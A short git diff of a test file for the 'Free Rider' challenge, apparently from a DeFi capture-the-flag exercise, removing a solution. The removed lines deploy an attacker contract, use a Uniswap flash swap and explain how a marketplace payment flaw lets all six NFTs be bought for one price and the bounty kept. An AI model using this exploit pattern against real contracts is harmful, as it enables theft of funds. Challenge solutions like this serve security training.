@@ -106,23 +106,6 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const attacker = await (await ethers.getContractFactory('FreeRiderAttacker', player)).deploy(
-            weth.address,
-            marketplace.address,
-            devsContract.address,
-            nft.address,
-            player.address,
-        );
-        const wethAmount = 15n * 10n ** 18n; // 15 weth needed to buy all 6 NFTs.
-        await uniswapPair.connect(player).swap(wethAmount, 0, attacker.address, "0x11");
-
-        /*
-        Explanation:
-        You can buy all 6 tokens for only 15 ETH as opposed to 15 ETH each.
-        You can obtain 15 WETH in a Uniswap flash swap.
-        Then we send the tokens to recovery, get the 45 ETH prize.
-        Pay back the loan and keep the rest.
-        */
         
     });
 
